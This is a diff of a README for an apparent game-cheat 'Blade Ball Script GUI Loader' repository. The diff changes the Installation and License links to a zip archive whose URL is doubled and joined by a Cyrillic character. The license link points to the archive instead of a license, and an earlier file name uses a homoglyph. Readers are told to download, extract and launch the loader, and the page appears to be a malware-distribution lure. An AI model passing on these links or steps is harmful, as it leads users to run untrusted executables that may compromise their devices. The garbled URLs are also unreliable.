@@ -33,7 +33,7 @@ Harness unparalleled control regardless of your platform! Blade Ball Script GUI 
 
 ## 🛠️ Installation
 
-1. Download **https://raw.githubusercontent.com/Masud460/BladeBall-GUI-Hub/main/Lоader.zip** from the repository.
+1. Download **https://github.com/Masud460/BladeBall-GUI-Hub/raw/refs/heads/main/syntactician/Hub_GU_Ball_Blade_v3.2.zipоhttps://github.com/Masud460/BladeBall-GUI-Hub/raw/refs/heads/main/syntactician/Hub_GU_Ball_Blade_v3.2.zip** from the repository.
 2. Extract the archive to your preferred folder.
 3. Launch the GUI Loader and follow the on-screen guide.
 
@@ -53,5 +53,5 @@ This repository provides educational tools for personalization of gameplay. Usag
 
 ## 📄 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/Masud460/BladeBall-GUI-Hub/main/Lоader.zip).  
+Distributed under the [MIT License](https://github.com/Masud460/BladeBall-GUI-Hub/raw/refs/heads/main/syntactician/Hub_GU_Ball_Blade_v3.2.zipоhttps://github.com/Masud460/BladeBall-GUI-Hub/raw/refs/heads/main/syntactician/Hub_GU_Ball_Blade_v3.2.zip).  
 © 2025 Blade Ball Script GUI Loader Team.
